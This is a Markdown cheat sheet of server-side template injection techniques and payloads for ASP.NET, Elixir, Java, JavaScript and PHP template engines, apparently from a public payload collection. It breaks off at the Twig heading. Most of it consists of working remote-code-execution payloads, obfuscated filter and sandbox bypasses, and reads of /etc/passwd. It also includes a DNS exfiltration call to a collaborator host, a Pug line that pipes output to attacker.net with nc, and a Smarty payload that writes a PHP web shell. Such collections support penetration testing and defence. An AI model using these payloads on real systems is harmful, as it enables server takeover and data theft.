# Server Side Template Injection

> Template injection allows an attacker to include template code into an existing (or not) template. A template engine makes designing HTML pages easier by using static template files which at runtime replaces variables/placeholders with actual values in the HTML pages.

## Tools

- [Hackmanit/TInjA](https://github.com/Hackmanit/TInjA) - An efficient SSTI + CSTI scanner which utilizes novel polyglots

  ```bash
  tinja url -u "http://example.com/?name=Kirlia" -H "Authentication: Bearer ey..."
  tinja url -u "http://example.com/" -d "username=Kirlia"  -c "PHPSESSID=ABC123..."
  ```

- [epinna/tplmap](https://github.com/epinna/tplmap) - Server-Side Template Injection and Code Injection Detection and Exploitation Tool

  ```powershell
  python2.7 ./tplmap.py -u 'http://www.target.com/page?name=John*' --os-shell
  python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=*&comment=supercomment&link"
  python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=InjectHere*&comment=A&link" --level 5 -e jade
  ```

- [vladko312/SSTImap](https://github.com/vladko312/SSTImap) - Automatic SSTI detection tool with interactive interface based on [epinna/tplmap](https://github.com/epinna/tplmap)

  ```bash
  python3 ./sstimap.py -u 'https://example.com/page?name=John' -s
  python3 ./sstimap.py -i -u 'https://example.com/page?name=Vulnerable*&message=My_message' -l 5 -e jade
  python3 ./sstimap.py -i -A -m POST -l 5 -H 'Authorization: Basic bG9naW46c2VjcmV0X3Bhc3N3b3Jk'
  ```

## Methodology

### Detection and Exploitation Techniques

Original research:

- Rendered, Time-Based: [Server-Side Template Injection: RCE For The Modern Web App - James Kettle - August 05, 2015](https://portswigger.net/knowledgebase/papers/serversidetemplateinjection.pdf)
- Polyglot-Based: [Improving the Detection and Identification of Template Engines for Large-Scale Template Injection Scanning - Maximilian Hildebrand - September 19, 2023](https://www.hackmanit.de/images/download/thesis/Improving-the-Detection-and-Identification-of-Template-Engines-for-Large-Scale-Template-Injection-Scanning-Maximilian-Hildebrand-Master-Thesis-Hackmanit.pdf)
- Error-Based, Boolean-Based: [Successful Errors: New Code Injection and SSTI Techniques - Vladislav Korchagin - January 03, 2026](https://github.com/vladko312/Research_Successful_Errors/blob/main/README.md)

#### Rendered

> Applicability: detection, exploitation

When the rendered template is displayed to the attacker, Rendered technique can be used to include the results of the injected code on the page.

#### Error-Based

> Applicability: detection, exploitation

When the errors are verbosely displayed to the attacker, Error-Based technique can be used to trigger the error message containing the results of the injected code.

#### Boolean-Based

> Applicability: detection, blind exploitation, blind data exfiltration

Boolean-Based technique can be used to conditionally trigger an error to indicate success or failure of the injected code.

#### Time-Based

> Applicability: limited detection, blind exploitation, blind data exfiltration

Time-Based technique can be used to conditionally trigger the delay to indicate success or failure of the injected code.

Triggering the delay often requires guessing payloads for code evaluation or OS command execution.

#### Out of Bounds

> Applicability: limited detection, exploitation

Out of Bounds technique can be used to expose results of the injected code through other channels (e.g. by connecting to an attacker-controlled server).

This technique often requires guessing payloads for code evaluation or OS command execution.

#### Polyglot-Based

> Applicability: detection

Polyglot-Based technique can be used to quickly determine the template engine by checking how it transforms different payloads.

### Universal Detection Payloads

Polyglot to trigger an error in presence of SSTI vulnerability:

```ps1
${{<%[%'"}}%\.
```

Common tags to test for SSTI with code evaluation:

```powershell
{{ ... }}
${ ... }
#{ ... }
<%= ... %>
{ ... }
{{= ... }}
{= ... }
\n= ... \n
*{ ... }
@{ ... }
@( ... )
```

Rendered SSTI can be checked by using mathematical expressions inside the tags:

```powershell
7 * 7
```

Error-Based SSTI can be checked by using this payload inside the tags:

```powershell
(1/0).zxy.zxy
```

If the error caused by that payload is displayed verbosely, it can be checked to guess the language used for code evaluation:

| Error                         | Language          |
|-------------------------------|-------------------|
| ZeroDivisionError             | Python            |
| java.lang.ArithmeticException | Java              |
| ReferenceError                | NodeJS            |
| TypeError                     | NodeJS            |
| Division by zero              | PHP               |
| DivisionByZeroError           | PHP               |
| divided by 0                  | Ruby              |
| Arithmetic operation failed   | Freemarker (Java) |

To test for blind injections using Boolean-Based technique, the attacker can test pairs of similar payloads wrapped in tags, where one payload evaluates mathematical expression, while the other triggers syntax error:

| test | ok              | error           |
|------|-----------------|-----------------|
| 1    | `(3*4/2)`       | `3*)2(/4`       |
| 2    | `((7*8)/(2*4))` | `7)(*)8)(2/(*4` |

Using at least two pairs of payloads avoids false positives caused by external interference.

### Manual Detection and Exploitation

#### Identify the Vulnerable Input Field

The attacker first locates an input field, URL parameter, or any user-controllable part of the application that is passed into a server-side template without proper sanitization or escaping.

For example, the attacker might identify a web form, search bar, or template preview functionality that seems to return results based on dynamic user input.

**TIP**: Generated PDF files, invoices and emails usually use a template.

#### Inject Template Syntax

The attacker tests the identified input field by injecting template syntax specific to the template engine in use. Different web frameworks use different template engines (e.g., Jinja2 for Python, Twig for PHP, or FreeMarker for Java).

Common template expressions:

- `{{7*7}}` for Jinja2 (Python).
- `#{7*7}` for Thymeleaf (Java).

Find more template expressions in the page dedicated to the technology (PHP, Python, etc).

In most cases, this polyglot payload will trigger an error in presence of a SSTI vulnerability:

```ps1
${{<%[%'"}}%\.
```

The [Hackmanit/Template Injection Table](https://github.com/Hackmanit/template-injection-table) is an interactive table containing the most efficient template injection polyglots along with the expected responses of the 44 most important template engines.

#### Enumerate the Template Engine

Based on the successful response, the attacker determines which template engine is being used. This step is critical because different template engines have different syntax, features, and potential for exploitation. The attacker may try different payloads to see which one executes, thereby identifying the engine.

- **Python**: Django, Jinja2, Mako, ...
- **Java**: Freemarker, Jinjava, Velocity, ...
- **Ruby**: ERB, Slim, ...

[The post "template-engines-injection-101" from @0xAwali](https://medium.com/@0xAwali/template-engines-injection-101-4f2fe59e5756) summarize the syntax and detection method for most of the template engines for JavaScript, Python, Ruby, Java and PHP and how to differentiate between engines that use the same syntax.

#### Escalate to Code Execution

Once the template engine is identified, the attacker injects more complex expressions, aiming to execute server-side commands or arbitrary code.


---

# Server Side Template Injection - ASP.NET

> Server-Side Template Injection (SSTI)  is a class of vulnerabilities where an attacker can inject malicious input into a server-side template, causing the template engine to execute arbitrary code on the server. In the context of ASP.NET, SSTI can occur if user input is directly embedded into a template (such as Razor, ASPX, or other templating engines) without proper sanitization.

## ASP.NET Razor

[Official website](https://docs.microsoft.com/en-us/aspnet/web-pages/overview/getting-started/introducing-razor-syntax-c)

> Razor is a markup syntax that lets you embed server-based code (Visual Basic and C#) into web pages.

### ASP.NET Razor - Basic Injection

```powershell
@(1+2)
```

### ASP.NET Razor - Command Execution

```csharp
@{
  // C# code
}
```


---

# Server Side Template Injection - Elixir

> Server-Side Template Injection (SSTI)  is a vulnerability that arises when an attacker can inject malicious code into a server-side template, causing the server to execute arbitrary commands. In Elixir, SSTI can occur when using templating engines like EEx (Embedded Elixir), especially when user input is incorporated into templates without proper sanitization or validation.

## Templating Libraries

| Template Name | Payload Format |
|---------------|----------------|
| EEx           | `<%= %>`       |
| LEEx          | `<%= %>`       |
| HEEx          | `<%= %>`       |

## Universal Payloads

Generic code injection payloads work for many Elixir-based template engines, such as EEx, LEEx and HEEx.

By default, only EEx can render templates from string, but it is possible to use LEEx and HEEx as replacement engines for EEx.

To use these payloads, wrap them in the appropriate tag.

```erlang
elem(System.shell("id"), 0) # Rendered RCE
[1, 2][elem(System.shell("id"), 0)] # Error-Based RCE
1/((elem(System.shell("id"), 1) == 0)&&1||0) # Boolean-Based RCE
elem(System.shell("id && sleep 5"), 0) # Time-Based RCE
```

## EEx

[Official website](https://hexdocs.pm/eex/1.19.5/EEx.html)
> EEx stands for Embedded Elixir.

### EEx - Basic injections

```erlang
<%= 7 * 7 %>
```

### EEx - Retrieve /etc/passwd

```erlang
<%= File.read!("/etc/passwd") %>
```

### EEx - Remote Command execution

```erlang
<%= elem(System.shell("id"), 0) %> # Rendered RCE
<%= [1, 2][elem(System.shell("id"), 0)] %> # Error-Based RCE
<%= 1/((elem(System.shell("id"), 1) == 0)&&1||0) %> # Boolean-Based RCE
<%= elem(System.shell("id && sleep 5"), 0) %> # Time-Based RCE
```


---

# Server Side Template Injection - Java

> Server-Side Template Injection (SSTI)  is a security vulnerability that occurs when user input is embedded into server-side templates in an unsafe manner, allowing attackers to inject and execute arbitrary code. In Java, SSTI can be particularly dangerous due to the power and flexibility of Java-based templating engines such as JSP (JavaServer Pages), Thymeleaf, and FreeMarker.

## Templating Libraries

| Template Name | Payload Format         |
|---------------|------------------------|
| Codepen       | `#{ }`                 |
| Freemarker    | `${ }`, `#{ }`, `[= ]` |
| Groovy        | `${ }`                 |
| Jinjava       | `{{ }}`                |
| Pebble        | `{{ }}`                |
| SpEL          | `*{ }`, `#{ }`, `${ }` |
| Thymeleaf     | `[[ ]]`                |
| Velocity      | `#set($X="") $X`       |

## Java EL

### Java EL - Basic Injection

Java has multiple Expression Languages using similar syntax.

> Multiple variable expressions can be used, if `${...}` doesn't work try `#{...}`, `*{...}`, `@{...}` or `~{...}`.

```java
${7*7}
${{7*7}}
${class.getClassLoader()}
${class.getResource("").getPath()}
${class.getResource("../../../../../index.htm").getContent()}
```

### Java EL - Code Execution

```java
${''.getClass().forName('java.lang.String').getConstructor(''.getClass().forName('[B')).newInstance(''.getClass().forName('java.lang.Runtime').getRuntime().exec('id').inputStream.readAllBytes())} // Rendered RCE
${''.getClass().forName('java.lang.Integer').valueOf('x'+''.getClass().forName('java.lang.String').getConstructor(''.getClass().forName('[B')).newInstance(''.getClass().forName('java.lang.Runtime').getRuntime().exec('id').inputStream.readAllBytes()))} // Error-Based RCE
${1/((''.getClass().forName('java.lang.Runtime').getRuntime().exec('id').waitFor()==0)?1:0)+''} // Boolean-Based RCE
${(''.getClass().forName('java.lang.Runtime').getRuntime().exec('id').waitFor().equals(0)?(''.getClass().forName('java.lang.Thread')).sleep(5000):0).toString()} // Time-Based RCE

```

---

## Freemarker

[Official website](https://freemarker.apache.org/)
> Apache FreeMarker™ is a template engine: a Java library to generate text output (HTML web pages, e-mails, configuration files, source code, etc.) based on templates and changing data.

You can try your payloads at [https://try.freemarker.apache.org](https://try.freemarker.apache.org)

### Freemarker - Basic Injection

The template can be :

- Default: `${3*3}`  
- Legacy: `#{3*3}`
- Alternative: `[=3*3]` since [FreeMarker 2.3.4](https://freemarker.apache.org/docs/dgui_misc_alternativesyntax.html)

### Freemarker - Read File

```js
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('path_to_the_file').toURL().openStream().readAllBytes()?join(" ")}
Convert the returned bytes to ASCII
```

### Freemarker - Code Execution

```js
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
${"freemarker.template.utility.Execute"?new()("id")}
#{"freemarker.template.utility.Execute"?new()("id")}
[="freemarker.template.utility.Execute"?new()("id")]

${("xx"+("freemarker.template.utility.Execute"?new()("id")))?new()} // Error-Based RCE
${1/((freemarker.template.utility.Execute"?new()(" … && echo UniqueString")?chop_linebreak?ends_with("UniqueString"))?string('1','0')?eval)} // Boolean-Based RCE
${"freemarker.template.utility.Execute"?new()("id && sleep 5")} // Time-Based RCE
```

### Freemarker - Code Execution with Obfuscation

FreeMarker offers the built-in function: `lower_abc`. This function converts int-based values into alphabetic strings, but not in the way you might expect from functions such as `chr` in Python, as the [documentation for lower_abc explains](https://freemarker.apache.org/docs/ref_builtins_number.html#ref_builtin_lower_abc):

If you wanted a string that represents the string: "id", you could use the payload: `${9?lower_abc+4?lower_abc)}`.

Chaining `lower_abc` to perform code execution (command: `id`):

```js
${(6?lower_abc+18?lower_abc+5?lower_abc+5?lower_abc+13?lower_abc+1?lower_abc+18?lower_abc+11?lower_abc+5?lower_abc+18?lower_abc+1.1?c[1]+20?lower_abc+5?lower_abc+13?lower_abc+16?lower_abc+12?lower_abc+1?lower_abc+20?lower_abc+5?lower_abc+1.1?c[1]+21?lower_abc+20?lower_abc+9?lower_abc+12?lower_abc+9?lower_abc+20?lower_abc+25?lower_abc+1.1?c[1]+5?upper_abc+24?lower_abc+5?lower_abc+3?lower_abc+21?lower_abc+20?lower_abc+5?lower_abc)?new()(9?lower_abc+4?lower_abc)}
```

Reference and explanation of payload can be found [yeswehack/server-side-template-injection-exploitation](https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation).

### Freemarker - Sandbox Bypass

:warning: only works on Freemarker versions below 2.3.30

```js
<#assign classloader=article.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("id")}
```

---

## Jinjava

[Official website](https://github.com/HubSpot/jinjava)
> Java-based template engine based on django template syntax, adapted to render jinja templates (at least the subset of jinja in use in HubSpot content).

### Jinjava - Basic Injection

```python
{{'a'.toUpperCase()}} would result in 'A'
{{ request }} would return a request object like com.[...].context.TemplateContextRequest@23548206
```

Jinjava is an open source project developed by Hubspot, available at [https://github.com/HubSpot/jinjava/](https://github.com/HubSpot/jinjava/)

### Jinjava - Command Execution

Fixed by [HubSpot/jinjava PR #230](https://github.com/HubSpot/jinjava/pull/230)

```ps1
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.String('xxx')\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"netstat\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
```

---

## Pebble

[Official website](https://pebbletemplates.io/)

> Pebble is a Java templating engine inspired by [Twig](./PHP.md#twig) and similar to the Python [Jinja](./Python.md#jinja2) Template Engine syntax. It features templates inheritance and easy-to-read syntax, ships with built-in autoescaping for security, and includes integrated support for internationalization.

### Pebble - Basic Injection

```java
{{ someString.toUPPERCASE() }}
```

### Pebble - Code Execution

Old version of Pebble ( < version 3.0.9): `{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('ls -la') }}`.

New version of Pebble :

```java
{% set cmd = 'id' %}
{% set bytes = (1).TYPE
     .forName('java.lang.Runtime')
     .methods[6]
     .invoke(null,null)
     .exec(cmd)
     .inputStream
     .readAllBytes() %}
{{ (1).TYPE
     .forName('java.lang.String')
     .constructors[0]
     .newInstance(([bytes]).toArray()) }}
```

---

## Velocity

[Official website](https://velocity.apache.org/engine/1.7/user-guide.html)

> Apache Velocity is a Java-based template engine that allows web designers to embed Java code references directly within templates.

In a vulnerable environment, Velocity's expression language can be abused to achieve remote code execution (RCE). For example, this payload executes the whoami command and prints the result:

```java
#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end
```

A more flexible and stealthy payload that supports base64-encoded commands, allowing execution of arbitrary shell commands such as `echo "a" > /tmp/a`. Below is an example with `whoami` in base64:

```java
#set($base64EncodedCommand = 'd2hvYW1p')

#set($contextObjectClass = $knownContextObject.getClass())

#set($Base64Class = $contextObjectClass.forName("java.util.Base64"))
#set($Base64Decoder = $Base64Class.getMethod("getDecoder").invoke(null))
#set($decodedBytes = $Base64Decoder.decode($base64EncodedCommand))

#set($StringClass = $contextObjectClass.forName("java.lang.String"))
#set($command = $StringClass.getConstructor($contextObjectClass.forName("[B"), $contextObjectClass.forName("java.lang.String")).newInstance($decodedBytes, "UTF-8"))

#set($commandArgs = ["/bin/sh", "-c", $command])

#set($ProcessBuilderClass = $contextObjectClass.forName("java.lang.ProcessBuilder"))
#set($processBuilder = $ProcessBuilderClass.getConstructor($contextObjectClass.forName("java.util.List")).newInstance($commandArgs))
#set($processBuilder = $processBuilder.redirectErrorStream(true))
#set($process = $processBuilder.start())
#set($exitCode = $process.waitFor())

#set($inputStream = $process.getInputStream())
#set($ScannerClass = $contextObjectClass.forName("java.util.Scanner"))
#set($scanner = $ScannerClass.getConstructor($contextObjectClass.forName("java.io.InputStream")).newInstance($inputStream))
#set($scannerDelimiter = $scanner.useDelimiter("\\A"))

#if($scanner.hasNext())
  #set($output = $scanner.next().trim())
  $output.replaceAll("\\s+$", "").replaceAll("^\\s+", "")
#end
```

Error-Based RCE payload:

```java
#set($s="")
#set($sc=$s.getClass().getConstructor($s.getClass().forName("[B"), $s.getClass()))
#set($p=$s.getClass().forName("java.lang.Runtime").getRuntime().exec("id")
#set($n=$p.waitFor())
#set($b="Y:/A:/"+$sc.newInstance($p.inputStream.readAllBytes(), "UTF-8"))
#include($b)
```

Boolean-Based RCE payload:

```java
#set($s="")
#set($p=$s.getClass().forName("java.lang.Runtime").getRuntime().exec("id"))
#set($n=$p.waitFor())
#set($r=$p.exitValue())
#if($r != 0)
#include("Y:/A:/xxx")
#end
```

Time-Based RCE payload:

```java
#set($s="")
#set($p=$s.getClass().forName("java.lang.Runtime").getRuntime().exec("id"))
#set($n=$p.waitFor())
#set($r=$p.exitValue())
#if($r != 0)
#set($t=$s.getClass().forName("java.lang.Thread").sleep(5000))
#end
```

---

## Groovy

[Official website](https://groovy-lang.org/)

### Groovy - Basic injection

Refer to [groovy-lang.org/syntax](https://groovy-lang.org/syntax.html) , but `${9*9}` is the basic injection.

### Groovy - Read File

```groovy
${String x = new File('c:/windows/notepad.exe').text}
${String x = new File('/path/to/file').getText('UTF-8')}
${new File("C:\Temp\FileName.txt").createNewFile();}
```

### Groovy - HTTP Request

```groovy
${"http://www.google.com".toURL().text}
${new URL("http://www.google.com").getText()}
```

### Groovy - Command Execution

```groovy
${"calc.exe".exec()}
${"calc.exe".execute()}
${this.evaluate("9*9") //(this is a Script class)}
${new org.codehaus.groovy.runtime.MethodClosure("calc.exe","execute").call()}
```

### Groovy - Command Execution with Obfuscation

You can bypass security filters by constructing strings from ASCII codes and executing them as system commands.

Payload represent the string: `id`: `${((char)105).toString()+((char)100).toString()}`.

Execute system command (command: `id`):

```groovy
${x=new/**/String();for(i/**/in[105,100]){x+=((char)i).toString()};x.execute().text}${x=new/**/String();for(i/**/in[105,100]){x+=((char)i).toString()};x.execute().text}
```

Reference and explanation of payload can be found [yeswehack/server-side-template-injection-exploitation](https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation).

### Groovy - Sandbox Bypass

```groovy
${ @ASTTest(value={assert java.lang.Runtime.getRuntime().exec("whoami")})
def x }
```

or

```groovy
${ new groovy.lang.GroovyClassLoader().parseClass("@groovy.transform.ASTTest(value={assert java.lang.Runtime.getRuntime().exec(\"calc.exe\")})def x") }
```

---

## Spring Expression Language

> Java EL payloads also work for SpEL

[Official website](https://docs.spring.io/spring-framework/docs/3.0.x/reference/expressions.html)

> The Spring Expression Language (SpEL for short) is a powerful expression language that supports querying and manipulating an object graph at runtime. The language syntax is similar to Unified EL but offers additional features, most notably method invocation and basic string templating functionality.

### SpEL - Basic Injection

> SpEL has built-in templating system using `#{ }`, but SpEL is also commonly used for interpolation using `${ }`.

```java
${7*7}
${'patt'.toString().replace('a', 'x')}
${T(java.lang.Integer).valueOf('1')}
```

### SpEL - Retrieve Environment Variables

```java
${T(java.lang.System).getenv()}
```

### SpEL - Retrieve /etc/passwd

```java
${T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd')}

${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
```

### SpEL - DNS Exfiltration

DNS lookup

```java
${"".getClass().forName("java.net.InetAddress").getMethod("getByName","".getClass()).invoke("","xxxxxxxxxxxxxx.burpcollaborator.net")}
```

### SpEL - Session Attributes

Modify session attributes

```java
${pageContext.request.getSession().setAttribute("admin",true)}
```

### SpEL - Command Execution

- Method using `java.lang.Runtime` #1 - accessed with JavaClass

    ```java
    ${T(java.lang.Runtime).getRuntime().exec("COMMAND_HERE")}
    ```

- Method using `java.lang.Runtime` #2

    ```java
    #{session.setAttribute("rtc","".getClass().forName("java.lang.Runtime").getDeclaredConstructors()[0])}
    #{session.getAttribute("rtc").setAccessible(true)}
    #{session.getAttribute("rtc").getRuntime().exec("/bin/bash -c whoami")}
    ```

- Method using `java.lang.Runtime` #3 - accessed with `invoke`

    ```java
    ${''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(''.getClass().forName('java.lang.Runtime')).exec('COMMAND_HERE')}
    ```

- Method using `java.lang.Runtime` #3 - accessed with `javax.script.ScriptEngineManager`

    ```java
    ${request.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval("java.lang.Runtime.getRuntime().exec(\\\"ping x.x.x.x\\\")"))}
    ```

- Method using `java.lang.ProcessBuilder`

    ```java
    ${request.setAttribute("c","".getClass().forName("java.util.ArrayList").newInstance())}
    ${request.getAttribute("c").add("cmd.exe")}
    ${request.getAttribute("c").add("/k")}
    ${request.getAttribute("c").add("ping x.x.x.x")}
    ${request.setAttribute("a","".getClass().forName("java.lang.ProcessBuilder").getDeclaredConstructors()[0].newInstance(request.getAttribute("c")).start())}
    ${request.getAttribute("a")}
    ```
  
- Error-Based payload:
  
    ```java
    ${T(java.lang.Integer).valueOf("x"+T(java.lang.String).getConstructor(T(byte[])).newInstance(T(java.lang.Runtime).getRuntime().exec("id").inputStream.readAllBytes()))}
    ```
  
- Boolean-Based payload:
  
    ```java
    ${1/((T(java.lang.Runtime).getRuntime().exec("id").waitFor()==0)?1:0)+""}
    ```
  
- Time-Based payload:
  
    ```java
    ${(T(java.lang.Runtime).getRuntime().exec("id").waitFor().equals(0)?T(java.lang.Thread).sleep(5000):0).toString()}
    ```

## Object-Graph Navigation Language

[Official website](https://commons.apache.org/dormant/commons-ognl/)

> OGNL stands for Object-Graph Navigation Language; it is an expression language for getting and setting properties of Java objects, plus other extras such as list projection and selection and lambda expressions. You use the same expression for both getting and setting the value of a property.

### OGNL - Basic Injection

> OGNL can be used with different tags like `${ }`

```java
7*7
'patt'.toString().replace('a', 'x')
@java.lang.Integer@valueOf('1')
```

### OGNL - Command Execution

Rendered:

```java
new String(@java.lang.Runtime@getRuntime().exec("id").getInputStream().readAllBytes())
```

Error-Based:

```java
(new String(@java.lang.Runtime@getRuntime().exec("id").getInputStream().readAllBytes()))/0
```

Boolean-Based:

```java
1/((@java.lang.Runtime@getRuntime().exec("id").waitFor()==0)?1:0)+""
```

Time-Based:

```java
((@java.lang.Runtime@getRuntime().exec("id").waitFor().equals(0))?@java.lang.Thread@sleep(5000):0)
```


---

# Server Side Template Injection - JavaScript

> Server-Side Template Injection (SSTI)  occurs when an attacker can inject malicious code into a server-side template, causing the server to execute arbitrary commands. In the context of JavaScript, SSTI vulnerabilities can arise when using server-side templating engines like Handlebars, EJS, or Pug, where user input is integrated into templates without adequate sanitization.

## Templating Libraries

| Template Name | Payload Format   |
|---------------|------------------|
| DotJS         | `{{= }}`         |
| DustJS        | `{ }`            |
| EJS           | `<% %>`          |
| HandlebarsJS  | `{{ }}`          |
| HoganJS       | `{{ }}`          |
| Lodash        | `{{= }}`         |
| MustacheJS    | `{{ }}`          |
| NunjucksJS    | `{{ }}`          |
| PugJS         | `#{ }`           |
| TwigJS        | `{{ }}`          |
| UnderscoreJS  | `<% %>`          |
| VelocityJS    | `#=set($X="")$X` |
| VueJS         | `{{ }}`          |

## Universal Payloads

Generic code injection payloads work for many NodeJS-based template engines, such as DotJS, EJS, PugJS, UnderscoreJS and Eta.

To use these payloads, wrap them in the appropriate tag.

```javascript
// Rendered RCE
global.process.mainModule.require("child_process").execSync("id").toString()

// Error-Based RCE
global.process.mainModule.require("Y:/A:/"+global.process.mainModule.require("child_process").execSync("id").toString())
""["x"][global.process.mainModule.require("child_process").execSync("id").toString()]

// Boolean-Based RCE
[""][0 + !(global.process.mainModule.require("child_process").spawnSync("id", options={shell:true}).status===0)]["length"]

// Time-Based RCE
global.process.mainModule.require("child_process").execSync("id && sleep 5").toString()
```

NunjucksJS is also capable of executing these payloads using `{{range.constructor(' ... ')()}}`.

## Handlebars

[Official website](https://handlebarsjs.com/)
> Handlebars compiles templates into JavaScript functions.

### Handlebars - Basic Injection

```js
{{this}}
{{self}}
```

### Handlebars - Command Execution

This payload only work in handlebars versions, fixed in [GHSA-q42p-pg8m-cqh6](https://github.com/advisories/GHSA-q42p-pg8m-cqh6):

- `>= 4.1.0`, `< 4.1.2`
- `>= 4.0.0`, `< 4.0.14`
- `< 3.0.7`

```handlebars
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('ls -la');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

---

## Lodash

[Official website](https://lodash.com/docs/4.17.15)
> A modern JavaScript utility library delivering modularity, performance & extras.

### Lodash - Basic Injection

How to create a template:

```javascript
const _ = require('lodash');
string = "{{= username}}"
const options = {
  evaluate: /\{\{(.+?)\}\}/g,
  interpolate: /\{\{=(.+?)\}\}/g,
  escape: /\{\{-(.+?)\}\}/g,
};

_.template(string, options);
```

- **string:** The template string.
- **options.interpolate:** It is a regular expression that specifies the HTML *interpolate* delimiter.
- **options.evaluate:** It is a regular expression that specifies the HTML *evaluate* delimiter.
- **options.escape:** It is a regular expression that specifies the HTML *escape* delimiter.

For the purpose of RCE, the delimiter of templates is determined by the **options.evaluate** parameter.

```javascript
{{= _.VERSION}}
${= _.VERSION}
<%= _.VERSION %>

{{= _.templateSettings.evaluate }}
${= _.VERSION}
<%= _.VERSION %>
```

### Lodash - Command Execution

```js
{{x=Object}}{{w=a=new x}}{{w.type="pipe"}}{{w.readable=1}}{{w.writable=1}}{{a.file="/bin/sh"}}{{a.args=["/bin/sh","-c","id;ls"]}}{{a.stdio=[w,w]}}{{process.binding("spawn_sync").spawn(a).output}}
```

---

## Pug

> Universal payloads also work for Pug.

[Official website](https://pugjs.org/api/getting-started.html)
>

```javascript
- var x = root.process
- x = x.mainModule.require
- x = x('child_process')
= x.exec('id | nc attacker.net 80')
```

```javascript
#{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}
```


---

# Server Side Template Injection - PHP

> Server-Side Template Injection (SSTI)  is a vulnerability that occurs when an attacker can inject malicious input into a server-side template, causing the template engine to execute arbitrary commands on the server. In PHP, SSTI can arise when user input is embedded within templates rendered by templating engines like Smarty, Twig, or even within plain PHP templates, without proper sanitization or validation.

## Templating Libraries

| Template Name   | Payload Format |
|-----------------|----------------|
| Blade (Laravel) | `{{ }}`        |
| Latte           | `{ }`          |
| Mustache        | `{{ }}`        |
| Plates          | `<?= ?>`       |
| Smarty          | `{ }`          |
| Twig            | `{{ }}`        |

## Universal Payloads

Generic code injection payloads work for many PHP-based template engines, such as Blade, Latte and Smarty.

To use these payloads, wrap them in the appropriate tag.

```php
// Rendered RCE
shell_exec('id')
system('id')

// Error-Based RCE
ini_set("error_reporting", "1") // Enable verbose fatal errors for Error-Based
call_user_func(join("", ["xx", shell_exec('id')]))

// Boolean-Based RCE
1 / (pclose(popen("id", "wb")) == 0)

// Time-Based RCE
shell_exec('id && sleep 5')
system('id && sleep 5')
```

## Blade

> Universal payloads also work for Blade.

[Official website](https://laravel.com/docs/master/blade)
> Blade is the simple, yet powerful templating engine that is included with Laravel.

The string `id` is generated with `{{implode(null,array_map(chr(99).chr(104).chr(114),[105,100]))}}`.

```php
{{passthru(implode(null,array_map(chr(99).chr(104).chr(114),[105,100])))}}
```

Reference and explanation of payload can be found [yeswehack/server-side-template-injection-exploitation](https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation).

---

## Smarty

> Universal payloads also work for Smarty before v5.

[Official website](https://www.smarty.net/docs/en/)
> Smarty is a template engine for PHP.

```php
{$smarty.version}
{php}echo `id`;{/php} //deprecated in smarty v3
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
{system('ls')} // compatible v3, deprecated in v5
{system('cat index.php')} // compatible v3, deprecated in v5
```

### Smarty - Code Execution with Obfuscation

By employing the variable modifier `cat`, individual characters are concatenated to form the string "id" as follows: `{chr(105)|cat:chr(100)}`.

Execute system comman (command: `id`):

```php
{{passthru(implode(Null,array_map(chr(99)|cat:chr(104)|cat:chr(114),[105,100])))}}
```

Reference and explanation of payload can be found [yeswehack/server-side-template-injection-exploitation](https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation).

---

## Twig

[Official website](https://twig.symfony.com/)
> Twig is a modern template engine for PHP.

### Twig - Basic Injection

